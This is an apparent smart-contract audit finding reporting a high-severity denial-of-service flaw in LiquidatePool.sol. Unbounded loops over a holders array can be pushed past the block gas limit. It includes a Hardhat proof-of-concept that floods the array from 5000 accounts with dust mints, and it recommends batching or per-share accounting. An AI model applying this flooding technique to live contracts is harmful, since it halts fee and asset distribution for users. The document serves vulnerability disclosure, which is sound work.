## [High] Possible DoS attack due to unbounded for loops in LiquidatePool.sol

### Severity

High Risk

### Date Modified

Jan 9th, 2023¡4

### Summary

In the contract LiquidatePool.sol we have 2 functions that depend on the loop over holders.length:

`distributeAssets()`

`distributeFees()`

A malicious user can keep generating new addresses and minting minimal amounts of tokens to make the aforementioned functions exceed the block gas limit, stopping the distribution of fees and assets.

### Vulnerability Details (PoC)

To prove that we can add infinite addresses to the holders array, we need to add to the hardhat.config.js file:

```
mocha: {
    timeout: 0,
  },
  networks: {
    hardhat: {
      accounts: {
        count: 5000,
      },
    },
  },
```

Now, we are going to create the PoC:

1. We set the hardhat signers to 5000 to probe that we can add an unlimited addresses
2. We created the LiquidationPool.getHoldersLength() to return the number of users in the liquidationPool.
3. valueFee0 is the mint value where the Fee calculation is 0 so no cost to the attacker.
   - NOTE: This is also a vulnerability, also reported.
4. We add the 5000 malicious users to holders array.
5. We could continue adding users till the functions fail due to gas limit.

```
describe.only("Audit test", async () => {

    it("DoS adding infinite holders", async () => {
      console.log(
        "holders length init: ",
        await LiquidationPool.getHoldersLength()
      );

      const users = await ethers.getSigners();

      const valueFee0 = ethers.utils.parseEther("0.0000000000000001");

      for (let i = 0; i < users.length; i++) {
        await EUROs.mint(users[i].address, valueFee0);
        await EUROs.connect(users[i]).approve(
          LiquidationPool.address,
          valueFee0
        );
        await LiquidationPool.connect(users[i]).increasePosition(0, valueFee0);
        // ({ _position } = await LiquidationPool.position(users[i].address));
        // expect(_position.EUROs).to.equal(valueFee0);
      }

      console.log(
        "holders length after malicious: ",
        await LiquidationPool.getHoldersLength()
      );

      const distributeValue = ethers.utils.parseEther("0.5");
      await expect(LiquidationPool.distributeFees(distributeValue)).not.to.be
        .reverted;
    });
```

### Impact

The protocol will potentially stop distributing fees and assets, so this is a HIGH vulnerability that needs to be addressed before the protocol is deployed.

### Tools Used

Hardhat, manual.

### Recommendations

There are different approaches we can take:

1. Process the holders.length in batches.
2. Change the distribution to a dividensPerShare, for example, where we have created a fee x atomic value distribution or similar.
